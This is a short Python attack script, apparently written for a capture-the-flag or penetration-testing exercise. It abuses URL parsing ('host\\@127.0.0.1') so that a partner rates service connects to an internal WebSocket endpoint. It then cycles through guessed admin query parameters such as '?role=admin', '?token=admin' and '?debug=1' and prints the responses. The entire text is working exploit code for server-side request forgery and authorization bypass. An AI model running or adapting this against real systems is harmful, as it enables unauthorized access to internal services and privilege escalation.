import time, select
from ws import connect, send_frame, recv_frame
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws"
qs=["?role=admin","?partner=admin","?id=admin","?user=admin","?token=admin","?key=admin",
    "?role=ops","?admin=1","?debug=1","?feed=rates","?as=admin","?identity=admin",
    "?partner=admin&role=admin","?session=admin","?tenant=admin"]
for q in qs:
    try:
        s,resp=connect(inner=INNER+q); s.setblocking(False)
        out=[]; end=time.time()+1.0
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.1)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        print(q,"->",out); s.close()
    except Exception as e: print(q,"EXC",e)
